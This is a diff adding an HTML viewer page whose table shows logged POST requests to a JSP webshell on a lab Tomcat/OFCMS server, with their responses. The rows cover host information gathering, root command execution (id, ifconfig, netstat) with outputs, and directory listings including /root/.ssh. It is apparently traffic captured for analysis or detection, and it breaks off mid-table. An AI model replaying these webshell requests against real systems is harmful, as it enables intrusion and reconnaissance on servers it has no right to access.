@@ -1,0 +1,500 @@
+
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>JSONL Data Viewer</title>
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+        <link rel="stylesheet" href="https://cdn.datatables.net/1.10.21/css/jquery.dataTables.min.css">
+        <script src="https://code.jquery.com/jquery-3.5.1.js"></script>
+        <script src="https://cdn.datatables.net/1.10.21/js/jquery.dataTables.min.js"></script>
+        <style>
+            body {
+                padding: 20px;
+                background-color: #f8f9fa;
+            }
+            h1 {
+                margin-bottom: 20px;
+            }
+            table {
+                margin-top: 20px;
+            }
+            table td, table th {
+                word-wrap: break-word;
+                max-width: 300px;
+                white-space: pre-wrap;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1 class="text-center">JSONL Data Viewer</h1>
+            <div class="table-responsive">
+                <table border="1" class="dataframe table table-striped table-bordered">
+  <thead>
+    <tr style="text-align: right;">
+      <th></th>
+      <th>url</th>
+      <th>method</th>
+      <th>request</th>
+      <th>code</th>
+      <th>response</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <th>0</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '未知操作: Echo.java', 'content': 'ncDbidnntAtJtqhJsom4WzYUHByjiw2QbxOd5T703lynOb4rkwNXlmaIbZm5tCUeHINKV4zmtRp4zo93jxtmlSqljeqGAFlnHrw0L5mdNpMAbhW5oLHrZ7GzeXM4Y17mkIUsjh35ERNHuBb4lax29gufmWU7v6b9CVXkmvQpgnpVdO6fB8bw6g9onz414JoblAFEaRfwDNrUtnKYRbrAGYuSqEy4dkW5GT9I9mPrS1mIMXpgnIIRHhoQ4bo3yYVSq1y3pL1xL45eViwakHRoJU7jgbyDqmm0v8YXHdV0velRCRmaUkqumZFRhQevnHORv8nIhr84FPClQOZt5NfQGLnvzwILSF8ll7wZ2bCeiZxu33yqmSX1ntWws5EHGbQLNFJ2EGKfimcuUIuAkE11VOEkZd81vZSRjHOd1e1KRwBQ3t39O7RmorXuwUZlzrxZQpOjCDl68fhYmjXQjQZ1sMf1q3zjiWkGAnMY70IJmUUufedqCwZiXyWmraAPCvuf03y69cHqElZXstVfSMQgHSULs7B0V6NDQxskcL5urSWBDrCSYvlRIpawFaH6h6Ry5aXqmwmJTaLmWjpz7D6fKeNDdTEhioNJf6tWNwJ8COfK1kqBSH7iupb7cv6uADipjiGuEMgExM5i4IuSsnluCzEGiSxLuq22irBvBrevLXbJguLadVPUR16oA8g0peRdjCHxhsmw3jNyttOrKYxHS0bs312eNrEFftU6ZJ4i7ZgJeCy6ZOZHTjR5mFvPrguNPBIXjjW7cnilHoxoN4DexfLk61RNjmt3AYW08lVEYQGJphpm07Os9IleF1LTWSuF7X6ExiUOzr8lEKrgfIzFfVcP7fMlmTWATdXD0h2PCAY9B06mNea8PZhi7d21q5lI00NBJchUHj3YtcehdrhXtd4iIldWEhPhNRWOW6X46NYNSFQNzGWppuqd1sX4IMJ9W5ZSpEddgeVRGvl8PxcmlO6LWWBJaVCUg4joftEQW9cZL53oJ8uijEg9Gtmh6bWIDecJrEWKjWcQpYAZDFQ4kXE3vvC7KwOleMiN7dtkmVbTERx7iGtvTUD124Jb4xpPrhEOcT90hUsG6NrMbAHOsOQjNEcZCoFUhzc8TtS5iqhhJqAkT1OAGqTGx56wWXqQu3LXQKE4AiiDhJnvbfpMFcApDAYmqK5nP7low701pQCoDvvJSoUnUva7kdRjTHn9FO81Rk8rdGtHCju6E46Qpm22POYghVUUfIP31uBvp2q4UAkIymj8f9KZzEpxfsSee6sWVGmBP8eFmPkqmubYw9fLnXwG5VinrnMEBhr2GblfoTZ9NYmfKIalcviG63xglDYbSuljBHTWOO9tBSUSnqXpriq9u4oQQySVSOBEZWkqNniZ5ggM9WOHCCtJUnvrZxWj7N9Kc8LVd15NanX7cD2HkPq0nsew40249sf4CxBLX6HypXgVi9GdXFQxFzMreYxW48CfYwcxT5YfDrpZJGAaAfPAkA2BCSe'}</td>
+      <td>200</td>
+      <td>{'status': 'success', 'msg': 'ncDbidnntAtJtqhJsom4WzYUHByjiw2QbxOd5T703lynOb4rkwNXlmaIbZm5tCUeHINKV4zmtRp4zo93jxtmlSqljeqGAFlnHrw0L5mdNpMAbhW5oLHrZ7GzeXM4Y17mkIUsjh35ERNHuBb4lax29gufmWU7v6b9CVXkmvQpgnpVdO6fB8bw6g9onz414JoblAFEaRfwDNrUtnKYRbrAGYuSqEy4dkW5GT9I9mPrS1mIMXpgnIIRHhoQ4bo3yYVSq1y3pL1xL45eViwakHRoJU7jgbyDqmm0v8YXHdV0velRCRmaUkqumZFRhQevnHORv8nIhr84FPClQOZt5NfQGLnvzwILSF8ll7wZ2bCeiZxu33yqmSX1ntWws5EHGbQLNFJ2EGKfimcuUIuAkE11VOEkZd81vZSRjHOd1e1KRwBQ3t39O7RmorXuwUZlzrxZQpOjCDl68fhYmjXQjQZ1sMf1q3zjiWkGAnMY70IJmUUufedqCwZiXyWmraAPCvuf03y69cHqElZXstVfSMQgHSULs7B0V6NDQxskcL5urSWBDrCSYvlRIpawFaH6h6Ry5aXqmwmJTaLmWjpz7D6fKeNDdTEhioNJf6tWNwJ8COfK1kqBSH7iupb7cv6uADipjiGuEMgExM5i4IuSsnluCzEGiSxLuq22irBvBrevLXbJguLadVPUR16oA8g0peRdjCHxhsmw3jNyttOrKYxHS0bs312eNrEFftU6ZJ4i7ZgJeCy6ZOZHTjR5mFvPrguNPBIXjjW7cnilHoxoN4DexfLk61RNjmt3AYW08lVEYQGJphpm07Os9IleF1LTWSuF7X6ExiUOzr8lEKrgfIzFfVcP7fMlmTWATdXD0h2PCAY9B06mNea8PZhi7d21q5lI00NBJchUHj3YtcehdrhXtd4iIldWEhPhNRWOW6X46NYNSFQNzGWppuqd1sX4IMJ9W5ZSpEddgeVRGvl8PxcmlO6LWWBJaVCUg4joftEQW9cZL53oJ8uijEg9Gtmh6bWIDecJrEWKjWcQpYAZDFQ4kXE3vvC7KwOleMiN7dtkmVbTERx7iGtvTUD124Jb4xpPrhEOcT90hUsG6NrMbAHOsOQjNEcZCoFUhzc8TtS5iqhhJqAkT1OAGqTGx56wWXqQu3LXQKE4AiiDhJnvbfpMFcApDAYmqK5nP7low701pQCoDvvJSoUnUva7kdRjTHn9FO81Rk8rdGtHCju6E46Qpm22POYghVUUfIP31uBvp2q4UAkIymj8f9KZzEpxfsSee6sWVGmBP8eFmPkqmubYw9fLnXwG5VinrnMEBhr2GblfoTZ9NYmfKIalcviG63xglDYbSuljBHTWOO9tBSUSnqXpriq9u4oQQySVSOBEZWkqNniZ5ggM9WOHCCtJUnvrZxWj7N9Kc8LVd15NanX7cD2HkPq0nsew40249sf4CxBLX6HypXgVi9GdXFQxFzMreYxW48CfYwcxT5YfDrpZJGAaAfPAkA2BCSe'}</td>
+    </tr>
+    <tr>
+      <th>1</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '信息获取', 'whatever': 'P9M13GmzJSFSUYXB7nbkRbr2oGcEqMnajwiMyF4o4tOcoPkVTIVTiyZOhqHT3xYnAvvSE7DWlwapbrIEV6hb6sBoC6xQVRhuqICi7dQnZ8Rmz96E6tISlsMhRN1I9FPL5ZXDdqYDrn8p5sz6QxMzgpewLlJEdTgPl0pXW0gcSPMFkZ6MbXCGyrIveulf0lfwOozM1p1UPOlKcGUSYviRcNI9POKhDqrm86ZlG6BSryeQGSDUXAGiuERzUVaDIWNlRO3kCasGDobkTmxQP2Y0aE2ZhU0aMZ7f9W3QKanoqBiClC1yhZMfDi6VxKpjDndDWyNy8XX2wovFgkRx4z06Jhg6VXt58tM7i2fglLTOkHAHtXLHTQ6HprlcZpw41Iw7NrjNGZpPoMHBtN2utvi2uByvleIVRhtfuxT5hKkB4Nqmc0WorVYyey0tOWRr5oH7N4pEQAqOrddoXQEncUlBolWWewvzz0oBE5Uiueqg0luW1lPSPAUiKUDyMVeQQabyWK3hNvcE9m53iTsN2ttjf30H8ynKSmOgkd6skjz2oCsWMcNMOhTAzGWGMSJyHPZVU7M5kEqzMzZK2skZnVgjmE8bvaKLC4Z9oUJLFDAcLLaTBHEANvYxYzWoRDPC0PUytEpzgUyQ8CbE1fH5VkaEE7B9ThZMQvPXhk8OvHnaNhN9hCNlUS2NcFpIGlI4WdUaaQNxbjk0kX42BpYo6XxvArjGqo3JC2adN'}</td>
+      <td>200</td>
+      <td>{'msg': {'osInfo': 'Linux5.15.0-124-genericamd64', 'driveList': '/;', 'localIp': '172.17.0.2', 'currentPath': '/', 'arch': 'amd64', 'basicInfo': '<br/><font size=2 color=red>环境变量:</font><br/>PATH=/usr/lib/jvm/java-8-openjdk-amd64/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br/>DEBIAN_FRONTEND=noninteractive<br/>HOSTNAME=8ba8656664fc<br/>JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64<br/>LD_PRELOAD=/lib/x86_64-linux-gnu/libhash.so<br/>JDK_JAVA_OPTIONS= --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED --add-opens=java.base/java.util.concurrent=ALL-UNNAMED --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED<br/>PWD=/<br/>LANG=en_US.UTF-8<br/>HOME=/root<br/>SHLVL=1<br/>_=/usr/local/tomcat/bin/startup.sh<br/><br/><font size=2 color=red>JRE系统属性:</font><br/>java.vendor = Private Build<br/>sun.java.launcher = SUN_STANDARD<br/>catalina.base = /usr/local/tomcat<br/>sun.management.compiler = HotSpot 64-Bit Tiered Compilers<br/>catalina.useNaming = true<br/>os.name = Linux<br/>sun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes<br/>java.util.logging.config.file = /usr/local/tomcat/conf/logging.properties<br/>org.apache.el.GET_CLASSLOADER_USE_PRIVILEGED = false<br/>java.vm.specification.vendor = Oracle Corporation<br/>java.runtime.version = 1.8.0_432-8u432-ga~us1-0ubuntu2~22.04-ga<br/>user.name = root<br/>tomcat.util.scan.StandardJarScanFilter.jarsToScan = log4j-taglib*.jar,log4j-web*.jar,log4javascript*.jar,slf4j-taglib*.jar<br/>shared.loader = <br/>tomcat.util.buf.StringCache.byte.enabled = true<br/>java.naming.factory.initial = org.apache.naming.java.javaURLContextFactory<br/>user.language = en<br/>sun.boot.library.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64<br/>jdk.tls.ephemeralDHKeySize = 2048<br/>java.version = 1.8.0_432<br/>java.util.logging.manager = org.apache.juli.ClassLoaderLogManager<br/>user.timezone = GMT<br/>sun.arch.data.model = 64<br/>java.util.concurrent.ForkJoinPool.common.threadFactory = org.apache.catalina.startup.SafeForkJoinWorkerThreadFactory<br/>java.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed<br/>sun.cpu.isalist = <br/>sun.jnu.encoding = ANSI_X3.4-1968<br/>file.encoding.pkg = sun.io<br/>package.access = sun.,org.apache.catalina.,org.apache.coyote.,org.apache.jasper.,org.apache.tomcat.<br/>file.separator = /<br/>java.specification.name = Java Platform API Specification<br/>java.class.version = 52.0<br/>user.country = US<br/>java.home = /usr/lib/jvm/java-8-openjdk-amd64/jre<br/>java.vm.info = mixed mode<br/>os.version = 5.15.0-124-generic<br/>path.separator = :<br/>java.vm.version = 25.432-bga<br/>java.protocol.handler.pkgs = org.apache.catalina.webresources<br/>java.awt.printerjob = sun.print.PSPrinterJob<br/>sun.io.unicode.encoding = UnicodeLittle<br/>java.specification.maintenance.version = 6<br/>awt.toolkit = sun.awt.X11.XToolkit<br/>package.definition = sun.,java.,org.apache.catalina.,org.apache.coyote.,org.apache.jasper.,org.apache.naming.,org.apache.tomcat.<br/>java.naming.factory.url.pkgs = org.apache.naming<br/>user.home = /root<br/>org.apache.catalina.security.SecurityListener.UMASK = 0027<br/>java.specification.vendor = Oracle Corporation<br/>tomcat.util.scan.StandardJarScanFilter.jarsToSkip = annotations-api.jar,ant-junit*.jar,ant-launcher*.jar,ant*.jar,asm-*.jar,aspectj*.jar,bcel*.jar,biz.aQute.bnd*.jar,bootstrap.jar,catalina-ant.jar,catalina-ha.jar,catalina-storeconfig.jar,catalina-tribes.jar,catalina-ws.jar,catalina.jar,cglib-*.jar,cobertura-*.jar,commons-beanutils*.jar,commons-codec*.jar,commons-collections*.jar,commons-compress*.jar,commons-daemon.jar,commons-dbcp*.jar,commons-digester*.jar,commons-fileupload*.jar,commons-httpclient*.jar,commons-io*.jar,commons-lang*.jar,commons-logging*.jar,commons-math*.jar,commons-pool*.jar,derby-*.jar,dom4j-*.jar,easymock-*.jar,ecj-*.jar,el-api.jar,geronimo-spec-jaxrpc*.jar,h2*.jar,ha-api-*.jar,hamcrest-*.jar,hibernate*.jar,httpclient*.jar,icu4j-*.jar,jasper-el.jar,jasper.jar,jaspic-api.jar,jaxb-*.jar,jaxen-*.jar,jaxws-rt-*.jar,jdom-*.jar,jetty-*.jar,jmx-tools.jar,jmx.jar,jsp-api.jar,jstl.jar,jta*.jar,junit-*.jar,junit.jar,log4j*.jar,mail*.jar,objenesis-*.jar,oraclepki.jar,org.hamcrest.core_*.jar,org.junit_*.jar,oro-*.jar,servlet-api-*.jar,servlet-api.jar,slf4j*.jar,taglibs-standard-spec-*.jar,tagsoup-*.jar,tomcat-api.jar,tomcat-coyote.jar,tomcat-dbcp.jar,tomcat-i18n-*.jar,tomcat-jdbc.jar,tomcat-jni.jar,tomcat-juli-adapters.jar,tomcat-juli.jar,tomcat-util-scan.jar,tomcat-util.jar,tomcat-websocket.jar,tools.jar,unboundid-ldapsdk-*.jar,websocket-api.jar,wsdl4j*.jar,xercesImpl.jar,xml-apis.jar,xmlParserAPIs-*.jar,xmlParserAPIs.jar,xom-*.jar<br/>java.library.path = /usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib<br/>java.vendor.url = http://java.oracle.com/<br/>java.vm.vendor = Private Build<br/>common.loader = "${catalina.base}/lib","${catalina.base}/lib/*.jar","${catalina.home}/lib","${catalina.home}/lib/*.jar"<br/>java.runtime.name = OpenJDK Runtime Environment<br/>sun.java.command = org.apache.catalina.startup.Bootstrap start<br/>java.class.path = /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar<br/>java.vm.specification.name = Java Virtual Machine Specification<br/>java.vm.specification.version = 1.8<br/>catalina.home = /usr/local/tomcat<br/>sun.cpu.endian = little<br/>sun.os.patch.level = unknown<br/>java.io.tmpdir = /usr/local/tomcat/temp<br/>java.vendor.url.bug = http://bugreport.sun.com/bugreport/<br/>server.loader = <br/>os.arch = amd64<br/>java.awt.graphicsenv = sun.awt.X11GraphicsEnvironment<br/>java.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext<br/>user.dir = /<br/>line.separator = 
+<br/>java.vm.name = OpenJDK 64-Bit Server VM<br/>ignore.endorsed.dirs = <br/>file.encoding = ANSI_X3.4-1968<br/>java.specification.version = 1.8<br/>'}, 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>2</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '命令执行', 'cmd': 'cd / ;id', 'path': '/'}</td>
+      <td>200</td>
+      <td>{'msg': 'uid=0(root) gid=0(root) groups=0(root)
+', 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>3</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '命令执行', 'cmd': 'cd / ;ifconfig', 'path': '/'}</td>
+      <td>200</td>
+      <td>{'msg': 'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
+        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
+        RX packets 60155  bytes 19012840 (19.0 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 43570  bytes 21220052 (21.2 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 23802  bytes 19021650 (19.0 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 23802  bytes 19021650 (19.0 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+', 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>4</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '命令执行', 'cmd': 'cd / ;netstat -antlp', 'path': '/'}</td>
+      <td>200</td>
+      <td>{'msg': 'Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      277/redis-server 0. 
+tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      290/java            
+tcp        0      0 0.0.0.0:33060           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      266/sshd: /usr/sbin 
+tcp        0      0 127.0.0.1:8005          0.0.0.0:*               LISTEN      290/java            
+tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN      290/java            
+tcp        0      0 127.0.0.1:3306          127.0.0.1:55490         ESTABLISHED -                   
+tcp        0      0 127.0.0.1:35170         127.0.0.1:3306          ESTABLISHED 290/java            
+tcp        0      0 127.0.0.1:3306          127.0.0.1:33176         ESTABLISHED -                   
+tcp        0      0 127.0.0.1:3306          127.0.0.1:35170         ESTABLISHED -                   
+tcp        0      0 127.0.0.1:3306          127.0.0.1:58694         ESTABLISHED -                   
+tcp        0      0 127.0.0.1:58694         127.0.0.1:3306          ESTABLISHED 290/java            
+tcp        0      0 172.17.0.2:8080         192.168.2.1:60398       TIME_WAIT   -                   
+tcp        0      0 172.17.0.2:8080         192.168.2.1:49194       ESTABLISHED 290/java            
+tcp        0      0 127.0.0.1:3306          127.0.0.1:35162         ESTABLISHED -                   
+tcp        0      0 127.0.0.1:3306          127.0.0.1:58710         ESTABLISHED -                   
+tcp        0      0 172.17.0.2:8080         192.168.2.1:48944       ESTABLISHED 290/java            
+tcp        0      0 127.0.0.1:35252         127.0.0.1:3306          ESTABLISHED 290/java            
+tcp        0      0 127.0.0.1:35176         127.0.0.1:3306          TIME_WAIT   -                   
+tcp        0      0 127.0.0.1:33176         127.0.0.1:3306          ESTABLISHED 290/java            
+tcp        0      0 127.0.0.1:55490         127.0.0.1:3306          ESTABLISHED 290/java            
+tcp        0      0 172.17.0.2:8080         192.168.2.1:44444       TIME_WAIT   -                   
+tcp        0      0 172.17.0.2:8080         192.168.2.1:60414       TIME_WAIT   -                   
+tcp        0      0 127.0.0.1:35162         127.0.0.1:3306          ESTABLISHED 290/java            
+tcp        0      0 127.0.0.1:3306          127.0.0.1:35252         ESTABLISHED -                   
+tcp        0      0 127.0.0.1:58710         127.0.0.1:3306          ESTABLISHED 290/java            
+tcp6       0      0 :::22                   :::*                    LISTEN      266/sshd: /usr/sbin 
+', 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>5</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/', 'mode': 'list'}</td>
+      <td>200</td>
+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwx------', 'name': 'root', 'lastModified': '2024/12/08 02:30:24', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'srv', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'bin', 'lastModified': '2024/12/08 02:30:22', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'etc', 'lastModified': '2024/12/08 02:39:08', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'lib32', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'lib64', 'lastModified': '2024/09/11 14:07:49', 'type': 'directory'}, {'size': '340', 'perm': 'rwxr-xr-x', 'name': 'dev', 'lastModified': '2024/12/08 02:39:08', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxrwxrwx', 'name': 'tmp', 'lastModified': '2024/12/08 02:39:08', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'mnt', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'usr', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'home', 'lastModified': '2022/04/18 10:28:59', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'opt', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'var', 'lastModified': '2024/09/11 14:07:54', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'sbin', 'lastModified': '2024/12/07 09:02:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'lib', 'lastModified': '2024/12/07 09:02:18', 'type': 'directory'}, {'size': '0', 'perm': 'r-xr-xr-x', 'name': 'proc', 'lastModified': '2024/12/08 02:39:08', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'run', 'lastModified': '2024/12/08 02:39:10', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'media', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '0', 'perm': 'r-xr-xr-x', 'name': 'sys', 'lastModified': '2024/12/08 02:39:08', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'boot', 'lastModified': '2022/04/18 10:28:59', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'libx32', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'logs', 'lastModified': '2024/12/08 02:39:13', 'type': 'directory'}, {'size': '0', 'perm': 'rwxr-xr-x', 'name': '.dockerenv', 'lastModified': '2024/12/08 02:39:08', 'type': 'file'}], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>6</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/root/', 'mode': 'list'}</td>
+      <td>200</td>
+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '3267', 'perm': 'rw-r--r--', 'name': '.bashrc', 'lastModified': '2024/12/07 09:11:13', 'type': 'file'}, {'size': '161', 'perm': 'rw-r--r--', 'name': '.profile', 'lastModified': '2019/07/09 10:05:50', 'type': 'file'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.ssh', 'lastModified': '2024/12/08 02:30:24', 'type': 'directory'}], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>7</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/usr/', 'mode': 'list'}</td>
+      <td>200</td>
+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'libexec', 'lastModified': '2024/12/07 03:06:59', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'bin', 'lastModified': '2024/12/08 02:30:22', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'include', 'lastModified': '2024/12/07 04:35:08', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'local', 'lastModified': '2024/12/08 02:04:04', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'lib32', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'lib64', 'lastModified': '2024/09/11 14:07:49', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'share', 'lastModified': '2024/12/07 09:02:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'sbin', 'lastModified': '2024/12/07 09:02:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'src', 'lastModified': '2022/04/18 10:28:59', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'lib', 'lastModified': '2024/12/07 09:02:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'games', 'lastModified': '2022/04/18 10:28:59', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'libx32', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>8</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/usr/local/', 'mode': 'list'}</td>
+      <td>200</td>
+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'bin', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'include', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'etc', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'share', 'lastModified': '2024/12/07 03:07:02', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'sbin', 'lastModified': '2024/09/11 14:07:44', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'src', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'lib', 'lastModified': '2024/12/07 03:06:58', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'man', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'games', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'tomcat', 'lastModified': '2024/12/08 02:04:03', 'type': 'directory'}], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>9</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/usr/local/tomcat/', 'mode': 'list'}</td>
+      <td>200</td>
